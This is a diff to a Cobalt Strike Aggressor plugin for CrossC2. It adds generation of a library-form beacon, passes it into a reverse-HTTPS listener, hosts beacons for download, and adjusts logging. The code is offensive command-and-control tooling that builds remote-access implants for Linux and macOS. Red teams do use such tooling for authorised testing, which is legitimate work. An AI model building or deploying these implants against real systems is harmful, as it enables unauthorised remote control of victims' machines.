@@ -33,7 +33,7 @@ popup ssh {
     item "&Spawn" { 
         local('$bid');
         foreach $bid ($1) {
-            blog($bid, "[shell]: shell spawn");
+            btask($bid, "[shell]: shell spawn");
             bshell($bid, "spawn");
         }
     }
@@ -145,6 +145,33 @@ sub createCrossC2ListenerDialogCallBack {
     $c2Data = readb($handle, -1);
     closef($handle);
 
+    $c2_libData = '';
+    if ('-bind' isin $system) {
+    } else {
+        # create libbeacon data
+        $genCC2_lib = $CC2_PATH . $CC2_BIN;  
+        $genCC2_lib = $genCC2_lib." ".$domain." ". $port." ".$beaconKeyPath." ".$rebind_lib." ".$system."-lib ".$arch." ".$outputFileName.".lib";
+        elog($genCC2_lib);
+        $process_lib = exec($genCC2_lib);
+        $run_res = readAll($process_lib);
+        closef($process_lib);
+        $handle_lib = openf($outputFileName.".lib");
+        $c2_libData = readb($handle_lib, -1);
+        closef($handle_lib);
+        if (getSystemInfo() == 1) {
+            elog("genCrossC2 libbeacon -> ".$run_res[14]);
+        } else {
+            elog("genCrossC2 libbeacon -> ".$run_res[11]);
+        }
+        if ($rebind_lib ne 'null') {
+            if (getSystemInfo() == 1) {
+                elog("rebind protocol -> ".$run_res[16]);
+            } else {
+                elog("rebind protocol -> ".$run_res[13]);
+            }
+        }
+    }
+
     $uri = $3['uri'];
     $lport = $3['lport'];
 
@@ -155,7 +182,7 @@ sub createCrossC2ListenerDialogCallBack {
     if ($reverse_https_flag) {
         $listener_name = "CrossC2 beacon: reverse-https $system $arch { $listener }";
         # listener中携带了 CrossC2 beacon
-        listener_create_ext("CrossC2 reverse HTTPS { $listener }{ $system $arch }", "windows/beacon_bind_tcp", %(host => "127.0.0.1", port => 4444, CrossC2Beacon => $c2Data));
+        listener_create_ext("CrossC2 reverse HTTPS { $listener }{ $system $arch }", "windows/beacon_bind_tcp", %(host => "127.0.0.1", port => 4444, CrossC2Beacon => $c2Data, CrossC2libBeacon => $c2_libData));
     } else {
         $listener_name = "CrossC2 beacon: bind-tcp $system $arch";
         # listener中携带了 CrossC2 beacon
@@ -166,7 +193,8 @@ sub createCrossC2ListenerDialogCallBack {
     } else {
         $beaconUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", $listener_name.'[http]', false);
     }
-    show_message($listener_name);
+    elog("create listener: ".$listener_name);
+    show_message("create listener: ".$listener_name);
 }
 
 sub createCrossC2Listener {
